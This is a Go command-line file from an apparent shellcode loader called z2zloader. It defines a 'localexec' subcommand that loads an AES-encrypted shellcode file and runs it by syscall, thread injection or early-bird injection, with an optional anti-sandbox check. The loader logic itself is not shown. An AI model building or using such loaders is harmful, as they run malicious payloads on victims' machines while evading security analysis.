/*
Copyright © 2025 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"fmt"
	"github.com/spf13/cobra"
	"log"
	"z2zloader/tools"
)

var localexecCmd = &cobra.Command{
	Use:   "localexec",
	Short: "本地加载shellcode",
	Long: `执行本地加密过的aes-shellcode   For example:
.\z2zloader local -f file_path -m 1`,
	Run: func(cmd *cobra.Command, args []string) {
		sandbox, _ := rootCmd.PersistentFlags().GetBool("sandbox")
		fp, _ := cmd.Flags().GetString("file")
		module, _ := cmd.Flags().GetInt("module")
		fmt.Println("调用本地加载模块")
		if sandbox {
			tools.AntiVM()
		}
		tools.Local_loader(fp, module)
		log.Println("本地执行exe文件成功")
	},
}

func init() {
	rootCmd.AddCommand(localexecCmd)
	localexecCmd.Flags().StringP("file", "f", "output.bin", "加载本地shellcode文件,建议把shellcode放在同一目录下")
	localexecCmd.Flags().IntP("module", "m", 1, "选择shellcode加载方式,1为SyscallN执行,2为线程注入,3为earybirl注入，推荐使用3")
	localexecCmd.MarkFlagRequired("file")
}
